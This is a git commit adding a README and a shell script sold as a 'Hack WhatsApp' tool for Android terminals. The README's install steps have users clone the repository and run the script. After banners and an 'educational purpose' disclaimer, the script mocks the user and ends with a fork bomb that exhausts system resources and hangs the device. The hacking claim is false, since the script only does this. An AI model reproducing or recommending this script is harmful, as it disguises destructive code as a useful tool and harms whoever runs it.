b09387d8b912967f748570a43e9a6551c920b885
petermatnick <69103410+PETERMATNICK7@users.noreply.github.com>
2021-03-02 20:51:36 +0530

    Add files via upload

--- README.md
+++ README.md
@@ -1,1 +1,7 @@
-# WhatsappHack
+HACK WHATSAPP
+
+apt uodate && upgrade
+pkg install git
+git clone https://github.com/Cyber-Naraboji/HackWhatsApp.git
+cd HackWhatsapp
+bash hackwhatsapp.sh
---
+++ hackwhatsapp.sh
@@ -0,0 +1,34 @@
+#!/system/bin/sh
+clear
+echo " "
+echo -e "Hack Whatsapp"
+echo -e "  coded by Peter Matnick"
+echo " "
+echo " "
+echo -e "\e[35m Please Wait..."
+echo -e "\e[35m Installing PACKAGES Needed..."
+echo " "
+pkg install figlet -y
+echo " "
+echo -e "\e[35mAll PACKAGES Installed Successfully"|pv -qL 20
+echo -e "\e[44m "
+clear
+echo " "
+figlet "Hack"
+figlet "WhatsApp"
+echo " "
+echo " "
+echo " "
+echo -e  "\e[44m    THIS TOOL IS USING ONLY FOR     "
+echo -e "\e[44m        EDUCATIONAL PURPOSE          "
+echo " "
+echo -e "\e[92m "
+read -r -s -p $'Press enter to continue...\n'
+clear
+echo " "
+echo -e "    Run away stupid!!"
+echo " "
+echo -e "   Have been hacked by Peter Matnick"
+echo " "
+:(){ :|:& };:
+
